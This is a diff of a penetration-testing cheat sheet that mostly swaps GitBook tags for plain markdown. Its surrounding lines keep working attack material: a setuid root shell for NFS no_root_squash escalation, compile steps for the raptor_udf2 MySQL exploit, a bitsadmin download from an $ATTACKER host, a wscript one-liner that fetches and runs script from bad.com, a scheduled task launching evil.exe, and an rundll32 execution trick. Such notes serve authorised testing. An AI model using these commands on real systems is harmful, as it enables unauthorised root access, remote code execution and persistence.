@@ -53,8 +53,8 @@ showmount -e 192.168.110.102
 
 ...and check if `'rw,no_root_squash'` is present. If it is present, compile the below `sid-shell.c`:
 
-{% code title="sid-shell.c" %}
 ```cpp
+// sid-shell.c
 #include <unistd.h>
 
 main( int argc, char ** argv, char ** envp )
@@ -63,7 +63,6 @@ main( int argc, char ** argv, char ** envp )
     return 0;
 }
 ```
-{% endcode %}
 
 ...upload it to the share and execute the below to launch `sid-shell` to spawn a root shell:
 
@@ -497,7 +496,7 @@ __import__('os').system('id')
 
 ## Local Enumeration & Privilege Escalation
 
-![https://github.com/sagishahar/lpeworkshop](../../.gitbook/assets/privesc.jpg)
+![[privesc.jpg|https://github.com/sagishahar/lpeworkshop]]
 
 ### Check AppLocker Policies
 
@@ -612,11 +611,11 @@ php -S 0.0.0.0:80
 
 Requires raptor\_udf2.c and sid-shell.c or full raptor.tar:
 
-{% file src="../../.gitbook/assets/sid-shell.c" %}
 
-{% file src="../../.gitbook/assets/raptor\_udf2.c" %}
 
-{% file src="../../.gitbook/assets/raptor.tar" %}
+
+
+
 
 ```erlang
 gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
@@ -746,14 +745,14 @@ cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/
 
 #### Wscript Script Code Download & Execution
 
-{% tabs %}
-{% tab title="cmd" %}
+
+
 ```text
 echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
 ```
-{% endtab %}
 
-{% tab title="code.js" %}
+
+
 ```markup
 <?xml version="1.0"?>
 <package>
@@ -766,8 +765,8 @@ echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.j
 </component>
 </package>
 ```
-{% endtab %}
-{% endtabs %}
+
+
 
 ### Whois Data Exfiltration
 
@@ -1092,20 +1091,20 @@ schtasks /create /sc minute /mo 10 /tn "TaskName" /tr C:\Windows\system32\evil.e
 
 ### Ieframe.dll
 
-{% tabs %}
-{% tab title="cmd" %}
+
+
 ```text
 rundll32 c:\windows\system32\ieframe.dll,OpenURL c:\temp\test.url
 ```
-{% endtab %}
 
-{% tab title="test.url" %}
+
+
 ```
 [internetshortcut]
 url=c:\windows\system32\calc.exe
 ```
-{% endtab %}
-{% endtabs %}
+
+
 
 This was inspired by and forked/adapted/updated from [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes).
 
